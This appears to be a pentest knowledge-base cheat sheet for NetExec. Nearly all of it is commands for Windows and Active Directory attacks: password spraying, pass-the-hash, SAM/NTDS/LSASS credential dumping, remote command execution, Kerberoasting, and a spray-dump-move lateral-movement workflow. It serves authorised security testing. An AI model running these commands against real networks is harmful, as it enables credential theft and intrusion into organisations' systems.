---
id: "netexec"
title: "NetExec (CrackMapExec) - Network Pentesting Swiss Army Knife"
type: "tool"
category: "network"
subcategory: "active-directory"
tags: ["netexec", "crackmapexec", "smb", "winrm", "ldap", "mssql", "rdp", "credential-spraying", "lateral-movement", "enumeration"]
difficulty: "intermediate"
platforms: ["linux", "macos"]
source_url: "https://github.com/Pennyw0rth/NetExec"
related: ["impacket", "bloodhound"]
updated: "2026-04-14"
---

## Overview

NetExec (nxc) is the actively maintained successor to CrackMapExec (archived 2023). Network pentesting automation tool for credential validation, enumeration, command execution, and post-exploitation across Windows networks. Supports SMB, WinRM, LDAP, MSSQL, RDP, SSH, FTP, VNC, and WMI protocols. Optimized for large-scale network assessment with parallel execution.

## Installation

```bash
# Pip install
pip3 install netexec

# Pipx (recommended)
pipx install netexec

# From source
git clone https://github.com/Pennyw0rth/NetExec.git
cd NetExec
pip3 install .

# Kali
sudo apt install netexec

# Docker
docker run netexec

# Verify
nxc --help
nxc smb --help
```

## Authentication Methods

```bash
# Password
nxc smb TARGET -u user -p 'password'

# NTLM Hash (pass-the-hash)
nxc smb TARGET -u user -H NTLM_HASH
nxc smb TARGET -u user -H LM:NT

# Kerberos
nxc smb TARGET -u user -p 'password' -k

# Local auth (not domain)
nxc smb TARGET -u user -p 'password' --local-auth

# Null session
nxc smb TARGET -u '' -p ''

# Guest session
nxc smb TARGET -u 'guest' -p ''
```

## SMB Protocol

### Enumeration
```bash
# Basic host info (OS, hostname, domain, signing)
nxc smb 10.10.10.0/24
nxc smb targets.txt

# Enumerate shares
nxc smb TARGET -u user -p 'pass' --shares

# Enumerate users
nxc smb TARGET -u user -p 'pass' --users

# Enumerate groups
nxc smb TARGET -u user -p 'pass' --groups

# Enumerate logged-on users
nxc smb TARGET -u user -p 'pass' --loggedon-users

# Enumerate sessions
nxc smb TARGET -u user -p 'pass' --sessions

# Enumerate disks
nxc smb TARGET -u user -p 'pass' --disks

# Enumerate password policy
nxc smb TARGET -u user -p 'pass' --pass-pol

# RID brute force (user enumeration)
nxc smb TARGET -u user -p 'pass' --rid-brute

# Enumerate local groups
nxc smb TARGET -u user -p 'pass' --local-groups

# Enumerate interfaces
nxc smb TARGET -u user -p 'pass' --interfaces
```

### Credential Spraying
```bash
# Single user, single password
nxc smb TARGET -u user -p 'password'

# User list, single password
nxc smb TARGET -u users.txt -p 'Spring2026!'

# Single user, password list
nxc smb TARGET -u admin -p passwords.txt

# User list, password list (all combos)
nxc smb TARGET -u users.txt -p passwords.txt

# Continue after success
nxc smb TARGET -u users.txt -p 'password' --continue-on-success

# No brute force (1:1 mapping from user:pass lists)
nxc smb TARGET -u users.txt -p passwords.txt --no-bruteforce

# Multiple targets
nxc smb 10.10.10.0/24 -u user -p 'password'
nxc smb targets.txt -u user -p 'password'
```

### Credential Dumping
```bash
# Dump SAM hashes
nxc smb TARGET -u admin -p 'pass' --sam

# Dump LSA secrets
nxc smb TARGET -u admin -p 'pass' --lsa

# Dump NTDS.dit (Domain Controller)
nxc smb DC_IP -u admin -p 'pass' --ntds
nxc smb DC_IP -u admin -p 'pass' --ntds --enabled  # only enabled accounts
nxc smb DC_IP -u admin -p 'pass' --ntds vss         # using Volume Shadow Copy

# Dump LAPS passwords
nxc smb TARGET -u user -p 'pass' -M laps

# Dump with lsassy (in-memory credentials)
nxc smb TARGET -u admin -p 'pass' -M lsassy

# Dump DPAPI secrets
nxc smb TARGET -u admin -p 'pass' -M dpapi_creds
```

### Command Execution
```bash
# Execute command (default: wmiexec)
nxc smb TARGET -u admin -p 'pass' -x 'whoami'
nxc smb TARGET -u admin -p 'pass' -x 'ipconfig /all'

# PowerShell execution
nxc smb TARGET -u admin -p 'pass' -X 'Get-Process'

# Specify execution method
nxc smb TARGET -u admin -p 'pass' -x 'whoami' --exec-method smbexec
nxc smb TARGET -u admin -p 'pass' -x 'whoami' --exec-method atexec
nxc smb TARGET -u admin -p 'pass' -x 'whoami' --exec-method mmcexec
nxc smb TARGET -u admin -p 'pass' -x 'whoami' --exec-method wmiexec

# Put file on target
nxc smb TARGET -u admin -p 'pass' --put-file localfile.exe \\Windows\\Temp\\file.exe

# Get file from target
nxc smb TARGET -u admin -p 'pass' --get-file \\Windows\\Temp\\file.exe localfile.exe
```

### Spider (File Search)
```bash
# Spider shares for interesting files
nxc smb TARGET -u user -p 'pass' -M spider_plus

# Spider with specific options
nxc smb TARGET -u user -p 'pass' -M spider_plus -o EXCLUDE_DIR=IPC$
```

## WinRM Protocol

```bash
# Check WinRM access
nxc winrm TARGET -u user -p 'pass'

# Execute command
nxc winrm TARGET -u user -p 'pass' -x 'whoami'

# PowerShell
nxc winrm TARGET -u user -p 'pass' -X 'Get-Process'

# With hash
nxc winrm TARGET -u user -H NTLM_HASH
```

## LDAP Protocol

```bash
# Basic LDAP info
nxc ldap DC_IP -u user -p 'pass'

# Get user descriptions (password hints)
nxc ldap DC_IP -u user -p 'pass' -M get-desc-users

# AS-REP roastable users
nxc ldap DC_IP -u user -p 'pass' --asreproast asrep.txt

# Kerberoastable users
nxc ldap DC_IP -u user -p 'pass' --kerberoasting kerb.txt

# Enumerate users
nxc ldap DC_IP -u user -p 'pass' --users

# Enumerate groups
nxc ldap DC_IP -u user -p 'pass' --groups

# Password not required
nxc ldap DC_IP -u user -p 'pass' -M user-desc

# MAQ (Machine Account Quota)
nxc ldap DC_IP -u user -p 'pass' -M maq

# AD CS (Certificate Services)
nxc ldap DC_IP -u user -p 'pass' -M adcs

# LAPS
nxc ldap DC_IP -u user -p 'pass' -M laps
```

## MSSQL Protocol

```bash
# Connect and enumerate
nxc mssql TARGET -u user -p 'pass'

# Windows auth
nxc mssql TARGET -u user -p 'pass' -d domain

# Execute SQL query
nxc mssql TARGET -u sa -p 'pass' -q "SELECT @@version"
nxc mssql TARGET -u sa -p 'pass' -q "SELECT name FROM sys.databases"

# Execute OS command (xp_cmdshell)
nxc mssql TARGET -u sa -p 'pass' -x 'whoami'

# Enable xp_cmdshell
nxc mssql TARGET -u sa -p 'pass' -M mssql_priv
```

## RDP Protocol

```bash
# Check RDP access
nxc rdp TARGET -u user -p 'pass'

# Screenshot
nxc rdp TARGET -u user -p 'pass' --screenshot

# NLA check
nxc rdp TARGET -u user -p 'pass' --nla-screenshot
```

## SSH Protocol

```bash
# SSH authentication
nxc ssh TARGET -u user -p 'pass'

# Execute command
nxc ssh TARGET -u user -p 'pass' -x 'id'

# Key-based auth
nxc ssh TARGET -u user --key-file id_rsa
```

## Key Modules

```bash
# List all modules
nxc smb --list-modules

# BloodHound integration
nxc smb TARGET -u user -p 'pass' -M bloodhound -o NEODATABASE=neo4j NEOPASS=neo4j

# Impersonate
nxc smb TARGET -u admin -p 'pass' -M impersonate

# Add computer account
nxc smb TARGET -u user -p 'pass' -M add-computer -o NAME=NEWPC$ PASSWORD=Password1

# MS17-010 check
nxc smb TARGET -u '' -p '' -M ms17-010

# ZeroLogon check
nxc smb TARGET -u '' -p '' -M zerologon

# PetitPotam
nxc smb TARGET -u '' -p '' -M petitpotam

# GPP passwords
nxc smb TARGET -u user -p 'pass' -M gpp_password

# WebDAV
nxc smb TARGET -u user -p 'pass' -M webdav

# SCCM
nxc smb TARGET -u user -p 'pass' -M sccm
```

## Output & Logging

```bash
# Output to file
nxc smb TARGET -u user -p 'pass' --shares 2>&1 | tee output.txt

# Export to JSON
nxc smb TARGET -u user -p 'pass' --shares --export shares.json

# Log file
nxc smb TARGET -u user -p 'pass' --log nxc.log

# Verbose
nxc smb TARGET -u user -p 'pass' --verbose
```

## Common Attack Workflows

### Spray -> Access -> Dump -> Move
```bash
# 1. Spray credentials
nxc smb 10.10.10.0/24 -u users.txt -p 'Spring2026!' --continue-on-success

# 2. Check admin access
nxc smb 10.10.10.0/24 -u found_user -p 'Spring2026!' --local-auth

# 3. Dump credentials
nxc smb ADMIN_TARGET -u found_user -p 'Spring2026!' --sam
nxc smb ADMIN_TARGET -u found_user -p 'Spring2026!' -M lsassy

# 4. Use found hashes to move laterally
nxc smb 10.10.10.0/24 -u admin -H FOUND_HASH --local-auth
```

### Null Session Recon
```bash
nxc smb TARGET -u '' -p '' --shares
nxc smb TARGET -u '' -p '' --rid-brute
nxc smb TARGET -u '' -p '' --pass-pol
```

## Pro Tips

- Use `--continue-on-success` for credential spraying to find all valid combos
- `--no-bruteforce` does 1:1 user:pass mapping (user1:pass1, user2:pass2)
- Check `--pass-pol` before spraying to avoid lockouts
- `-M lsassy` dumps credentials from LSASS memory without touching disk
- `spider_plus` module finds sensitive files across network shares
- Always check for null sessions first: `-u '' -p ''`
- Use `-M get-desc-users` via LDAP - descriptions often contain passwords
- `--local-auth` for testing local admin accounts vs domain accounts
- NetExec's colored output shows Pwn3d! when you have admin access
- The database (`~/.nxc/`) stores all found credentials automatically
